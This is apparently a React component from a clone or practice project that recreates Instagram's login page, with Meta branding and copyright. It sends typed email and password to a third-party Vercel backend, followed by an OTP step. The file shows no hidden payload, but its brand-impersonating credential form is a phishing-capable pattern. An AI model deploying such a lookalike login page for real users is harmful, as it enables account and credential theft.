import React, { useState } from 'react';
import LoginHistory from './LoginHistory';
import './LoginScreen.css';

export default function LoginScreen() {
  const [email, setEmail] = useState('user@example.com');
  const [password, setPassword] = useState('password123');
  const [requiresOtp, setRequiresOtp] = useState(false);
  const [otp, setOtp] = useState('');
  const [userId, setUserId] = useState('user_123');
  const [message, setMessage] = useState('');
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [error, setError] = useState('');

  const handleLogin = async (e) => {
    e.preventDefault();
    setError('');
    setMessage('');

    try {
      const response = await fetch('https://instagram-story-module.vercel.app/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || 'Login failed');
      }

      if (data.requiresOtp) {
        setRequiresOtp(true);
        setUserId(data.userId);
        setMessage('Check your server terminal for the OTP code.');
      } else {
        setIsLoggedIn(true);
        setMessage(data.message || 'Login successful!');
      }
    } catch (err) {
      setError(err.message);
    }
  };

  const handleVerifyOtp = async (e) => {
    e.preventDefault();
    setError('');
    setMessage('');

    try {
      const response = await fetch('https://instagram-story-module.vercel.app/api/auth/verify-chrome-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, otp }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || 'OTP verification failed');
      }

      setIsLoggedIn(true);
      setRequiresOtp(false);
      setMessage('OTP verified successfully!');
    } catch (err) {
      setError(err.message);
    }
  };

  return (
    <div className="login-page">
      {!isLoggedIn ? (
        <div className="login-container">
          {/* Left Side: Phone Mockup Frame */}
          <div className="phone-mockup">
            <div className="phone-screen">
              <div className="phone-header">
                <span className="time">9:41</span>
              </div>
              <div className="phone-brand">Instagram</div>

              <div className="phone-stories">
                <div className="story-ring"><img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80" alt="story" className="avatar-demo" /></div>
                <div className="story-ring"><img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80" alt="story" className="avatar-demo" /></div>
                <div className="story-ring"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150&auto=format&fit=crop&q=80" alt="story" className="avatar-demo" /></div>
                <div className="story-ring"><img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=150&auto=format&fit=crop&q=80" alt="story" className="avatar-demo" /></div>
              </div>

              <div className="phone-feed">
                <div className="feed-card demo-1"></div>
                <div className="feed-card demo-2"></div>
              </div>
            </div>
          </div>

          {/* Right Side: Login Form Wrapper */}
          <div className="login-form-wrapper">
            <div className="login-box">
              <h1 className="logo-title">Instagram</h1>

              {error && <div className="mb-4 p-3 bg-red-100 text-red-700 text-sm rounded">{error}</div>}
              {message && <div className="mb-4 p-3 bg-blue-100 text-blue-700 text-sm rounded">{message}</div>}

              {!requiresOtp ? (
                <form onSubmit={handleLogin}>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Phone number, username, or email"
                    className="input-field"
                    required
                  />
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Password"
                    className="input-field"
                    required
                  />
                  <button type="submit" className="btn-login">
                    Log in
                  </button>
                </form>
              ) : (
                <form onSubmit={handleVerifyOtp}>
                  <input
                    type="text"
                    value={otp}
                    onChange={(e) => setOtp(e.target.value)}
                    placeholder="Enter 6-Digit OTP"
                    className="input-field"
                    required
                  />
                  <button type="submit" className="btn-login" style={{ background: '#22c55e' }}>
                    Verify OTP
                  </button>
                </form>
              )}

              <div className="divider">
                <div className="line"></div>
                <span className="or">OR</span>
                <div className="line"></div>
              </div>

              <button type="button" className="btn-fb">
                <i className="fb-icon">f</i> Log in with Facebook
              </button>

              <a href="#forgot" className="forgot-pass">Forgot password?</a>
            </div>

            <div className="signup-box">
              <p>Don't have an account? <a href="#signup">Sign up</a></p>
            </div>

            <div className="app-download">
              <p>Get the app.</p>
              <div className="store-buttons">
                <button type="button" className="store-btn">
                  <svg height="18" viewBox="0 0 170 170" width="18" xmlns="http://www.w3.org/2000/svg">
                    <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.35.13-9.16-1.9-14.42-6.08-3.04-2.52-6.9-7.14-11.58-13.84-7.23-10.36-12.91-21.78-17.03-34.26-4.13-12.48-6.19-24.12-6.19-34.91 0-14.15 3.65-25.59 10.95-34.33 7.3-8.74 16.51-13.21 27.64-13.41 5.43 0 11.14 1.44 17.13 4.31 5.99 2.87 9.87 4.31 11.64 4.31 2.07 0 6.16-1.57 12.27-4.7 6.12-3.14 11.89-4.59 17.3-4.36 12.35.76 22.09 5.25 29.23 13.48-11.25 6.84-16.73 16.21-16.44 28.11.22 9.57 4.13 17.51 11.73 23.82 7.6 6.32 16.58 9.68 26.94 10.09-2.07 6.81-4.71 13.51-7.92 20.12zM119.22 31.9c0-7.82 2.78-15.12 8.34-21.91 5.56-6.79 12.56-10.74 21-11.85.11 1.2.16 2.29.16 3.27 0 7.39-2.81 14.8-8.43 22.23-5.62 7.43-12.63 11.52-21.03 12.27-.65-1.22-.98-2.52-.98-3.91z" fill="#FFF"/>
                  </svg>
                  <div>
                    <div style={{ fontSize: '9px', opacity: 0.8 }}>Download on the</div>
                    <div style={{ fontSize: '13px', fontWeight: '600' }}>App Store</div>
                  </div>
                </button>

                <button type="button" className="store-btn">
                  <svg height="18" viewBox="0 0 512 512" width="18" xmlns="http://www.w3.org/2000/svg">
                    <path d="M325.3 234.3L104.2 13c-5.8-3.4-13.2-3.6-19.2-.5-6 3.1-9.8 9.3-9.8 16.1v467.2c0 6.8 3.8 13 9.8 16.1 3 1.6 6.3 2.3 9.6 2.3 3.6 0 7.2-.9 10.4-2.8l221.1-221.3c7-7 10.9-16.5 10.9-26.4 0-9.9-3.9-19.4-10.9-26.4zM112 458.7V53.3l189.3 189.3L112 458.7zM366.1 274.6l-31.5-31.5-44.5 44.5 44.5 44.5 31.5-31.5c6.3-6.3 9.8-14.7 9.8-23s-3.5-16.7-9.8-23zM350.2 212.8L139.7 2.3c-3-3-7.1-4.7-11.3-4.7-4.2 0-8.3 1.7-11.3 4.7L325.3 212.8l24.9 0z" fill="#FFF"/>
                  </svg>
                  <div>
                    <div style={{ fontSize: '9px', opacity: 0.8 }}>GET IT ON</div>
                    <div style={{ fontSize: '13px', fontWeight: '600' }}>Google Play</div>
                  </div>
                </button>
              </div>
            </div>
          </div>
        </div>
      ) : (
        <div className="login-box" style={{ width: '400px', margin: 'auto' }}>
          <p className="text-green-600 font-semibold text-lg mb-4">You are successfully logged in!</p>
          <button
            onClick={() => {
              setIsLoggedIn(false);
              setRequiresOtp(false);
              setMessage('');
            }}
            className="btn-login"
          >
            Sign Out
          </button>
        </div>
      )}

      {isLoggedIn && <LoginHistory userId={userId} />}

      <footer className="footer-links">
        <div className="links">
          <span>Meta</span> <span>About</span> <span>Blog</span> <span>Jobs</span> 
          <span>Help</span> <span>API</span> <span>Privacy</span> <span>Terms</span> 
          <span>Locations</span> <span>Instagram Lite</span> <span>Threads</span>
        </div>
        <p className="copyright">© 2026 Instagram from Meta</p>
      </footer>
    </div>
  );
}